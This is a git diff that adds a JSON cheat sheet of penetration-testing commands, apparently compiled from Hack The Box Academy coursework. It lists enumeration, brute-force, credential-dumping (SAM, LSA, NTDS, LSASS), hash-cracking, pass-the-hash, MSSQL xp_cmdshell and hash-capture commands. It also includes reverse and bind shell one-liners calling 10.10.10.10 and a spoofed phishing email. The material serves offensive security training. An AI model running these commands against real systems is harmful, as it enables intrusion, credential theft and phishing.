@@ -1,0 +1,150 @@
+{
+    "meta": {
+        "source": "Data inspired by Hack The Box Academy",
+        "url": "https://academy.hackthebox.com/"
+    },
+    "AWK Tips": {
+      "awk '{print}'": "Print the entire line.",
+      "awk '{print $1}'": "Print the first column (field 1).",
+      "awk '{print $2, $3}'": "Print multiple fields (field 2 and field 3).",
+      "awk 'END {print NR}'": "Print the total number of lines.",
+      "awk '{sum += $3} END {print sum}'": "Sum all values in the third column.",
+      "awk '{$2=\"REPLACED\"; print}'": "Replace the second column with static text 'REPLACED'.",
+      "awk 'NR>1 {print}'": "Skip the header row and print the rest.",
+      "awk '{$1=$2=$3=$4=$5=$6=$7=$8=$9=$10=$11=$12=\"\"; print $0}'": "Remove the first 12 fields and print the remainder of each line."
+      },
+
+
+
+    "NMAP": {
+        "nmap 10.129.42.253": "Run nmap on an IP",
+        "nmap -sV -sC -p- 10.129.42.253": "Run an nmap script scan on an IP",
+        "nmap --script smb-os-discovery.nse -p445 10.10.10.40": "Run an nmap script on an IP"
+
+    },
+    "SMB": {
+        "crackmapexec smb 10.129.12.15 -u jerry -p password_list --local-auth": "Use when targeting a non-domain joined computer",
+        "crackmapexec smb <FQDN/IP> --shares -u '' -p ''": "Enumerating SMB shares using null session authentication.",
+        "python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Share /home/kali/HTBA/Password": "Transfer files from Target to Attacker vis smb share",
+        "samrdump.py 10.129.14.128": "Username enumeration using Impacket scripts.",
+        "smbmap -H 10.129.14.128": "Network share enumeration using smbmap.",
+        "smbmap -H 10.129.14.128 -r <share>": "Recursive network share enumeration using smbmap.",
+        "smbmap -H 10.129.14.128 --download 'notes.txt'": "Download a specific file from the shared folder.",
+        "smbmap -H 10.129.14.128 --upload test.txt 'test.txt'": "Upload a specific file to the shared folder.",
+        "rpcclient -U'%' 10.10.110.17": "Null-session with the rpcclient."
+    },
+    "Connecting to Target": {
+        "xfreerdp /v:10.129.10.120 /u:htb-student /p:HTB_@cademy_stdnt!": "Connect to target using RDP. NOTE: use xfreerdp3 if xfreerdp does not work",
+        "evil-winrm -i 10.129.10.120 -u user -p password" :"Uses Evil-WinRM to establish a Powershell session with a target.",
+        "ssh user@10.129.10.120": "Uses SSH to connect to a target using a specified user.",
+        "ssh -i id_rsa jason@10.129.203.6": "Use ssh key to connect via ssh",
+        "rdesktop -u admin -p password123 192.168.2.143": "Connect to the RDP service using rdesktop in Linux."
+        
+
+    },
+    "Remote Password Attacks":{
+        "crackmapexec winrm 10.129.203.6 -u user.list -p password.list": "Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.",
+        "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f" :"Adding the DisableRestrictedAdmin Registry Key",
+        "hydra -C <user_pass.list> ssh://<IP>": "Uses Hydra with a list of credentials to attempt to login to a target over the specified service.",
+        "crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam": "Uses CrackMapExec with admin credentials to dump password hashes stored in SAM, over the network.",
+        "crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa": "Uses CrackMapExec with admin credentials to dump lsa secrets, over the network.",
+        "crackmapexec smb <ip> -u <username> -p <password> --ntds": "Uses CrackMapExecwith admin credentials to dump hashes from the ntds file over a network.",
+        "evil-winrm -i <ip> -u Administrator -H <passwordhash>": "Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of Pass-The-Hash attack."
+        
+
+    },
+    "Windows Local Password Attacks":{
+        "findstr /SIM /C:'password' *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml": "Uses Windows command-line based utility findstr to search for the string 'password' in many different file type.",
+        "pypykatz lsa minidump /path/to/lsassdumpfile":"Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file."
+
+
+    },
+    "Cracking Passwords":{
+        "hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt":"Uses Hashcat to crack NTLM hashes using a specified wordlist.",
+        "unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes" :"Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.",
+        "ssh2john SSH.private > ssh.hash": "Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash",
+        "office2john Protected.docx > protected-docx.hash": "Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.",
+        "pdf2john PDF.pdf > pdf.hash": "Runs Pdf2john script to convert a pdf file to a pdf has to be cracked.",
+        "zip2john ZIP.zip > zip.hash": "Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.",
+        "bitlocker2john -i Backup.vhd > backup.hashes": "Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes."
+    },
+    "Using Shells":{
+        "nc -lvnp <port>": "Start a nc listener on port",
+        "php -S 0.0.0.0:80": "PHP listener",
+        "bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'": "Send a reverse shell from the remote server",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f": "Another command to send a reverse shell from the remote server",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f": "Start a bind shell on the remote server",
+        "python -c 'import pty; pty.spawn('/bin/bash')'":"Upgrade shell TTY (1)",
+        "ctrl+z then stty raw -echo then fg then enter twice":"Upgrade shell TTY (2)"
+
+    },
+    "Transferring Files":{
+        "python3 -m http.server 8000": "Start a local webserver",
+        "wget http://10.10.14.1:8000/linpeas.sh": "Download a file on the remote server from our local machine",
+        "curl http://10.10.14.1:8000/linenum.sh -o linenum.sh": "Download a file on the remote server from our local machine",
+        "scp linenum.sh user@remotehost:/tmp/linenum.sh": "Transfer a file to the remote server with scp (requires SSH access)"
+
+    },
+    "Password Policy Filtering":{
+        "grep -E '^.{8,}$' wordlist.txt": "Minimum Length (e.g., 8 characters)",
+        "grep -E '[A-Z]' wordlist.txt": "At Least One Uppercase Letter",
+        "grep -E '[a-z]' wordlist.txt": "At Least One Lowercase Letter",
+        "grep -E '[0-9]' wordlist.txt": "At Least One Digit"
+
+    },
+    "Attacking and Enum SQL Databases":{
+        "mysql -u julio -pPassword123 -h 10.129.20.13": "Connecting to the MySQL server.",
+        "show variables like 'secure_file_priv';": "Check if the the secure file privileges are empty to read locally stored files on the system.",
+        "sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h": "Connecting to the MSSQL server from Linux.",
+        "sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h": "Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.",
+        "mssqlclient.py -p 1433 julio@10.129.203.7":"Connect to MSSQL using mssqlclient (from impacket toolkit",
+        "SHOW DATABASES;":"Show all available databases in MySQL.",
+        "SELECT name FROM master.dbo.sysdatabases": "Shows all available databases in MSSQL",
+        "USE htbusers;": "Select a specific database in MySQL.",
+        "USE <database>;": "Select a specific database in MSSQL",
+        "SHOW TABLES;": "Show all available tables in the selected database in MySQL.",
+        "SELECT * FROM users;": "Select all available entries from the 'users' table in MySQL.",
+        "SELECT name FROM master.dbo.sysdatabases":"how all available databases in MSSQL.",
+        "SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES": "Show all available tables in the selected database in MSSQL.",
+        "SELECT * FROM users": "Select all available entries from the 'users' table in MSSQL.",
+        "EXECUTE sp_configure 'xp_cmdshell', 1": "To enable the xp_cmdshell.",
+        "xp_cmdshell 'whoami'": "Execute a system command from MSSQL server.",
+        "EXEC master..xp_dirtree '\\10.10.16.62\\share'": "We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree. Use responder to capture the NTLM hash",
+        "EXEC master..xp_subdirs '\\10.10.110.17\\share'": "We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree. Use responder to capture the NTLM hash"
+
+    },
+    "DNS":{
+        "dig AXFR @ns1.inlanefreight.htb inlanefreight.htb" :" Perform an AXFR zone transfer attempt against a specific name server.",
+        "dig any inlanefreight.htb @ns1.inlanefreight.htb" :" ANY request to the specific nameserver.",
+        "dig ns inlanefreight.htb @ns1.inlanefreight.htb" :" NS request to the specific nameserver.",
+        "dig soa www.inlanefreight.com":"",
+        "dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb":"Subdomain brute forcing.",
+        "subfinder -d inlanefreight.com -v": "Brute-forcing subdomains.",
+        "subfinder -p inlanefreight.com -v": "Brute-forcing subdomains (use if -d does not work).",
+        "host support.inlanefreight.com":"DNS lookup for the specified subdomain.",
+        "fierce --domain zonetransfer.me": "used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer",
+        "python3 subbrute.py -p <domain> -s <wordlist> -r <resolvers.txt>":"Brute-forcing subdomains"
+
+    },
+    "Pass-The-Hash (PtH)":{
+        "xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9":"PtH using xfreerdp",
+        "xfreerdp3 /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9": "PtH using xfreerdp3",
+        "evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453": "PtH using evil-winrm",
+        "impacket-psexec administrator@10.129.81.61 -hashes :30B3783CE2ABF1AF70F77D0660CF3453": "PtH using impacket-psexec",
+        "crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE": "PtH using crackmapexec"
+    },
+    "SMTP":{
+        "host -t MX <domain>": "Identify a mail server",
+        "host -t A mail1.inlanefreight.htb" :"Display A record",
+        "smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.176.133":"To automate our enumeration process, mode VRFY, EXPN, RCPT",
+        "hydra  -l marlin@inlanefreight.htb -P /home/kali/HTBA/AtkCommService/FTP_Lab/passwords.list -f 10.129.176.133 pop3" : "Use this sytax change service as needed e.g. pop3, IMAP4, etc.",
+        "telnet commands": "USER, PASS, LIST, RETR",
+        "nmap -p25 -Pn --script smtp-open-relay 10.10.11.213": "Identify if an SMTP port allows an open relay",
+        "swaks --from <spoofed email> --to <target@email> --header 'Subject: whatever you want' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213": "phishing email"
+    }
+
+
+
+    
+
+}
